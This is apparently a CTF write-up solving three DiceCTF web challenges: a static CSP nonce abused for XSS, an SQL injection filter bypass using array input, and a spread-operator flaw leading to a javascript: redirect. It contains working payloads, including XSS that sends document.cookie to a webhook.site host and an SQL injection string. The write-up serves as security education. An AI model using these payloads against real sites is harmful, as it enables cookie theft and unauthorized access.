**[web/Babier CSP](https://babier-csp.dicec.tf/)**  
We have source code [index.js](https://lhtthao0430.github.io/web/dice/Babier_CSP/index.js)  
In line 8, it sets
```python
const NONCE = crypto.randomBytes(16).toString('base64');
```
and in line 26
```python
res.setHeader("Content-Security-Policy", `default-src none; script-src 'nonce-${NONCE}';`);
```
This code just run 1 time, so NONCE doesn't change after run server, view source, we have nonce
```
+ZSveZwTAUqC6Pt9p+rgUg==
```
Host a server using webhook.site, redirect and get the cookie
```javascript
https://babier-csp.dicec.tf/?name=%3Cscript%20nonce=%2BZSveZwTAUqC6Pt9p%2BrgUg==%3Elocation.href=%22https://webhook.site/c23c6a4a-1ad6-420d-a488-033f8762e6ed/?data=%22%2Bdocument.cookie%3C/script%3E
```
We got the secret
```
secret=4b36b1b8e47f761263796b1defd80745
```
Go to https://babier-csp.dicec.tf/4b36b1b8e47f761263796b1defd80745/
```
dice{web_1s_a_stat3_0f_grac3_857720}
```
**[web/Missing Flavortext](https://missing-flavortext.dicec.tf)**  
We have source code [index.js](https://lhtthao0430.github.io/web/dice/Missing_Flavortext/index.js)  
In line 34, it have filter ', let bypass it by using array input
```
username[]
```
It's a simple SQL Injection
```sql
admin' or '1' = '
```
We got the flag
```
dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}
```

**[web/Web Utils](https://web-utils.dicec.tf/)**  
We have source code [app.zip](https://lhtthao0430.github.io/web/dice/Web_Utils/app.zip)  
In [app/route/api.js]((https://lhtthao0430.github.io/web/dice/Web_Utils/app/route/api.js), line 39 we have spread oparator
```javascript
database.addData({ type: 'paste', ...req.body, uid });
```
[View source](https://web-utils.dicec.tf/view/iuwnxMEs), in line 11 we have
```javascript
if (type === 'link') return window.location = data;
```
We can change the req.body when createPaste to
```json
{"data":"some data","type":"link"}
```
It will understand that is a link and run window.location = data;  
Host a server using webhook.site, redirect and get the cookie
```json
{"data":"javascript:location.href='https://webhook.site/cf48efac-98a3-46d2-83af-141e6d39f133?data='+document.cookie","type":"link"}
```
Send the link to [Admin Bot](https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=web-utils) and get the flag
```
dice{f1r5t_u53ful_j4v45cr1pt_r3d1r3ct}
```